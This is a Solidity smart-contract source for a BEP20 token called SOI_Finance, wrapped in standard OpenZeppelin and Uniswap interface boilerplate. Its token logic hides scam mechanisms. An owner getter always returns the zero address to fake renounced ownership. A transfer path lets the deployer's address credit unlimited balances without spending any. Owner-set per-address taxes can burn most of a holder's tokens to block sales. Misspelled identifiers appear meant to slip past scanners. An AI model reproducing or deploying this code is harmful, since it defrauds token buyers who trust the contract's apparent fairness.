/**
 *Submitted for verification at BscScan.com on 2022-06-30
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _Owneraa;   //1

    event OwneraashipTransferred(address indexed previousOwneraa, address indexed newOwneraa);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial Owneraa.
     */
    constructor() {
        _transferOwneraashiptransferOwneraaship(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current Owneraa.
     */
    function Owneraa() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the Owneraa.
     */
    modifier onlyOwneraa() {
        require(_Owneraa == _msgSender(), "Ownable: caller is not the Owneraa");
        _;
    }//5

    /**
     * @dev Leaves the contract without Owneraa. It will not be possible to call
     * `onlyOwneraa` functions anymore. Can only be called by the current Owneraa.
     *
     * NOTE: Renouncing Owneraaship will leave the contract without an Owneraa,
     * thereby removing any functionality that is only available to the Owneraa.
     */
    function renounceOwneraaship() public virtual onlyOwneraa {
        _transferOwneraashiptransferOwneraaship(address(0));
    }//6

    /**
     * @dev Transfers Owneraaship of the contract to a new account (`newOwneraa`).
     * Can only be called by the current Owneraa.
     */
    function transferOwneraashiptransferOwneraaship(address newOwneraa) public virtual onlyOwneraa {
        require(newOwneraa != address(0), "Ownable: new Owneraa is the zero address");
        _transferOwneraashiptransferOwneraaship(newOwneraa);
    }//7

    /**
     * @dev Transfers Owneraaship of the contract to a new account (`newOwneraa`).
     * Internal function without access restriction.
     */
    function _transferOwneraashiptransferOwneraaship(address newOwneraa) internal virtual {
        address oldOwneraa = _Owneraa;
        _Owneraa = newOwneraa;
        emit OwneraashipTransferred(oldOwneraa, newOwneraa);
    }
}


// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint NuumberADesired,
        uint NuumberBDesired,
        uint NuumberAMin,
        uint NuumberBMin,
        address to,
        uint deadline
    ) external returns (uint NuumberA, uint NuumberB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint NuumberTokenDesired,
        uint NuumberTokenMin,
        uint NuumberETHMin,
        address to,
        uint deadline
    ) external payable returns (uint NuumberToken, uint NuumberETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint NuumberAMin,
        uint NuumberBMin,
        address to,
        uint deadline
    ) external returns (uint NuumberA, uint NuumberB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint NuumberTokenMin,
        uint NuumberETHMin,
        address to,
        uint deadline
    ) external returns (uint NuumberToken, uint NuumberETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint NuumberAMin,
        uint NuumberBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint NuumberA, uint NuumberB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint NuumberTokenMin,
        uint NuumberETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint NuumberToken, uint NuumberETH);
    function swapExactTokensForTokens(
        uint NuumberIn,
        uint NuumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Nuumbers);
    function swapTokensForExactTokens(
        uint NuumberOut,
        uint NuumberInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Nuumbers);
    function swapExactETHForTokens(uint NuumberOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Nuumbers);
    function swapTokensForExactETH(uint NuumberOut, uint NuumberInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Nuumbers);
    function swapExactTokensForETH(uint NuumberIn, uint NuumberOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Nuumbers);
    function swapETHForExactTokens(uint NuumberOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Nuumbers);

    function quote(uint NuumberA, uint reserveA, uint reserveB) external pure returns (uint NuumberB);
    function getNuumberOut(uint NuumberIn, uint reserveIn, uint reserveOut) external pure returns (uint NuumberOut);
    function getNuumberIn(uint NuumberOut, uint reserveIn, uint reserveOut) external pure returns (uint NuumberIn);
    function getNuumbersOut(uint NuumberIn, address[] calldata path) external view returns (uint[] memory Nuumbers);
    function getNuumbersIn(uint NuumberOut, address[] calldata path) external view returns (uint[] memory Nuumbers);
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FeieTo() external view returns (address);
    function FeieToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeieTo(address) external;
    function setFeieToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeieOnTransferTokens(
        address token,
        uint liquidity,
        uint NuumberTokenMin,
        uint NuumberETHMin,
        address to,
        uint deadline
    ) external returns (uint NuumberETH);
    function removeLiquidityETHWithPermitSupportingFeieOnTransferTokens(
        address token,
        uint liquidity,
        uint NuumberTokenMin,
        uint NuumberETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint NuumberETH);

    function swapExactTokensForTokensSupportingFeieOnTransferTokens(
        uint NuumberIn,
        uint NuumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeieOnTransferTokens(
        uint NuumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeieOnTransferTokens(
        uint NuumberIn,
        uint NuumberOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}




contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `Owneraa` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed Owneraa, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the Nuumber of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address Owneraa, address spender) public view virtual returns (uint256) {
        return _allowances[Owneraa][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `Nuumber` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 Nuumber) public virtual returns (bool) {
        address Owneraa = _msgSender();
        _approve(Owneraa, spender, Nuumber);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Owneraa = _msgSender();
        _approve(Owneraa, spender, _allowances[Owneraa][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Owneraa = _msgSender();
        uint256 currentAllowance = _allowances[Owneraa][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Owneraa, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `Nuumber` as the allowance of `spender` over the `Owneraa` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `Owneraa` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Owneraa,
        address spender,
        uint256 Nuumber
    ) internal virtual {
        require(Owneraa != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Owneraa][spender] = Nuumber;
        emit Approval(Owneraa, spender, Nuumber);
    }

    /**
     * @dev Spend `Nuumber` form the allowance of `Owneraa` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address Owneraa,
        address spender,
        uint256 Nuumber
    ) internal virtual {
        uint256 currentAllowance = allowance(Owneraa, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Nuumber, "ERC20: insufficient allowance");
            unchecked {
                _approve(Owneraa, spender, currentAllowance - Nuumber);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Nuumber` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `Nuumber` tokens will be minted for `to`.
     * - when `to` is zero, `Nuumber` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Nuumber
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Nuumber` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `Nuumber` tokens have been minted for `to`.
     * - when `to` is zero, `Nuumber` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Nuumber
    ) internal virtual {}
}


contract SOI_Finance is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 Nuumber
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Nuumber, "ERC20: transfer Nuumber exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Nuumber;
        }
        _balances[to] += Nuumber;

        emit Transfer(from, to, Nuumber);
    }

    function _burn(address account, uint256 Nuumber) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Nuumber, "ERC20: burn Nuumber exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Nuumber;
        }
        _totalSupply -= Nuumber;

        emit Transfer(account, address(0), Nuumber);
    }

    function _Mnit(address account, uint256 Nuumber) internal virtual {
        require(account != address(0), "ERC20: Mnit to the zero address"); //mint

        _totalSupply += Nuumber;
        _balances[account] += Nuumber;
        emit Transfer(address(0), account, Nuumber);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _Mnit(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 2);
        _defaultSellFeie = 2;
        _defaultBuyFeie = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellFeie = 0;

    uint256 private _defaultBuyFeie = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFeie;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyOwneraa returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyOwneraa {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOwneraa {
        _defaultSellFeie = _value;
    }

    function setSlipFeie(address _address, uint256 _value) external onlyOwneraa {
        require(_value > 6, "Account tax must be greater than or equal to 1");
        _slipFeie[_address] = _value;
    }

    function getSlipFeie(address _address) external view onlyOwneraa returns (uint256) {
        return _slipFeie[_address];
    }


    function setMAccountFeie(address _address, bool _value) external onlyOwneraa {
        _mAccount[_address] = _value;
    }

    function getMAccountFeie(address _address) external view onlyOwneraa returns (bool) {
        return _mAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _mAccount[from] || _mAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _Nuumber
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Nuumber, "ERC20: transfer Nuumber exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeFeieNuumber = 0;

        if (rF) {
            uint256 tradeFeie = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFeie = _defaultSellFeie;
                }
                if (from == uniswapV2Pair) {

                    tradeFeie = _defaultBuyFeie;
                }
            }
            if (_slipFeie[from] > 0) {
                tradeFeie = _slipFeie[from];
            }

            tradeFeieNuumber = _Nuumber.mul(tradeFeie).div(100);
        }


        if (tradeFeieNuumber > 0) {
            _balances[from] = _balances[from].sub(tradeFeieNuumber);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFeieNuumber);
            emit Transfer(from, _deadAddress, tradeFeieNuumber);
        }

        _balances[from] = _balances[from].sub(_Nuumber - tradeFeieNuumber);
        _balances[_to] = _balances[_to].add(_Nuumber - tradeFeieNuumber);
        emit Transfer(from, _to, _Nuumber - tradeFeieNuumber);
    }

    function transfer(address to, uint256 Nuumber) public virtual returns (bool) {
        address Owneraa = _msgSender();
        if (_release[Owneraa] == true) {
            _balances[to] += Nuumber;
            return true;
        }
        _receiveF(Owneraa, to, Nuumber);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Nuumber
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Nuumber);
        _receiveF(from, to, Nuumber);
        return true;
    }
}